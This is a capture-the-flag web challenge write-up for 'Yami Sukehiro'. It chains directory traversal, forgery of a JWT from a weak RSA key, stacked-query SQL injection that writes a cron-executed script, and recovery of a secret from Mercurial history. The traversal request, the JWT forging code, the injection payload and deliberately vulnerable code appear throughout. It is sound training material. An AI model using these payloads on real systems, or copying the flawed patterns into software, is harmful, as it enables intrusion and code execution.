# YAMI SUKEHIRO — Writeup

**Author:** saamnolimits
**Category:** Web
**Difficulty:** Hard
**Flags:** 2 (user + root), both regenerated per container boot

## Stage 0 — Recon

The site exposes:

- `/` — index with a booking form (POSTs to `/book`).
- `/register`, `/login`, `/logout`, `/dashboard` — standard auth flow.
- `/reminder/<id>` — generates an ICS calendar file, **redirects** to `/export/<name>`.
- `/export/<filename>` — downloads the generated file, then `rmtree`s the temp
  dir. This is stateful: each `/reminder/<id>` call creates exactly one `/export`.
- `/captaindashboard` — restricted to `role == "captain"`.

The auth cookie `X-AUTH-Token` is a JWT signed with RS256. The `jwk` claim
leaks the public-key modulus `n`.

## Stage 1 — Stateful Directory Traversal

The `/export/<filename>` handler does `os.path.join(temp_dir, filename)`. Because
`temp_dir` is a module-level variable updated only by `/reminder/<id>`, and the
`filename` is a `<path:…>` converter (allows slashes), traversal is possible —
but each traversal burns one slot (the handler `rmtree`s the temp dir on success).

Exploit pattern, per read:

```http
GET /reminder/<booking_id>    → 302 Location: /export/<ics_name>
GET /export/../../../etc/crontab
```

Interesting reads:

- `/etc/crontab` — reveals `*/1 * * * * yuno /bin/bash /data/scripts/dbmonitor.sh`
  and the `fixer-v*` pickup pipeline.
- `/opt/app/app.py`, `/opt/app/middleware/verification.py`,
  `/opt/app/config/signature.py` — Flask source.
- `/data/scripts/dbmonitor.sh` — the cron that pulls the newest `fixer-v*` and
  executes it as `yuno`.
- `/data/scripts/cron_runner.py` — the actual in-container cron simulator
  (same behaviour, single-UID implementation).

## Stage 2 — Weak RSA → forge Captain JWT

`config/signature.py`:

```python
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
```

`q` is a 20-bit prime. Trivial to factor `n` (factordb / `sympy.factorint` — under
a second). Recover `d`, reconstruct the private key, forge a JWT with
`role: "captain"`:

```python
jwt.encode({"email": "x@x", "role": "captain", "iat": now, "exp": now+3600,
            "jwk": {"kty":"RSA","n":str(n),"e":e}},
           private_pem, algorithm="RS256")
```

Set `X-AUTH-Token` cookie → `/captaindashboard` now renders.

## Stage 3 — SQLi via `order by` → MySQL FILE write → RCE

From [app.py](./app/app.py), the captain dashboard interpolates `order_query`:

```python
order_query = request.args.get('o', '')
sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
```

`MULTI_STATEMENTS` is set in `db_config`, so stacked queries work. The `yuno`
DB user has the `FILE` privilege (see [db/init.sql](./db/init.sql)), so:

```
GET /captaindashboard?s=&o=DESC;SELECT UNHEX('<fixer hex>') INTO DUMPFILE '/data/scripts/fixer-v<tag>.sh'-- 
```

Note: use `INTO DUMPFILE` (raw bytes) not `INTO OUTFILE` (which escapes `\n`
as the two-char literal `\n`). Also use a unique `<tag>` per write because
DUMPFILE refuses to overwrite.

The cron simulator ([scripts/cron_runner.py](./scripts/cron_runner.py)) polls
every 60 s and runs the newest `fixer-v*`. The fixer script copies
`/flags/user.txt` and `/flags/root.txt.enc` + runs `hg cat -r 0 config.py`
inside `/opt/hg_repo`, leaving all artefacts under `/tmp/` for exfil via the
same directory-traversal primitive. **→ user flag.**

## Stage 4 — Mercurial history → Captain Secret → decrypt root.txt

`/opt/hg_repo/` is a seeded Mercurial repo. `hg log` shows two commits:

```
changeset:   1:...
summary:     fix: moved CAPTAIN_SECRET into the vault (see captain.py)

changeset:   0:...
summary:     initial: captain vault config with secret
```

`hg cat -r 0 config.py` reveals:

```python
CAPTAIN_SECRET = "<24-char hex>"
```

(Raw `strings` on the revlog doesn't work — entries are zstd-compressed, so
`hg cat` is the clean recovery path.)

`/flags/root.txt.enc` was encrypted at boot time with:

```
openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:"$CAPTAIN_SECRET"
```

Decrypt → **root flag**.

## Why the gate holds under `runAsUser: 1000`

Under the platform's K8s security context, every process in the pod runs as
UID 1000 with identical supplementary groups, `allowPrivilegeEscalation: false`,
and all capabilities dropped. Filesystem ACLs between processes are therefore
impossible.

The gate for the root flag is not a filesystem boundary — it is the crypto:
`root.txt` never exists in plaintext on disk after entrypoint runs, and the
decryption key (`CAPTAIN_SECRET`) is scrubbed from env before `exec`ing
`supervisord`, persisting only in the Mercurial revlog where the attacker has
to solve a log-history puzzle to recover it.

## Flag minting

Both flags are per-instance. [entrypoint.sh](./entrypoint.sh) mints:

```
FLAG1=infodays{SaamNoLimits_<16 random hex>}
FLAG2=infodays{SaamNoLimits_<16 random hex>}
```

on every boot, unless the operator overrides via the K8s `flags-<TEAM_ID>`
secret referenced in [yami-sukehiro.yaml](../../../k8s/manifests/yami-sukehiro.yaml).
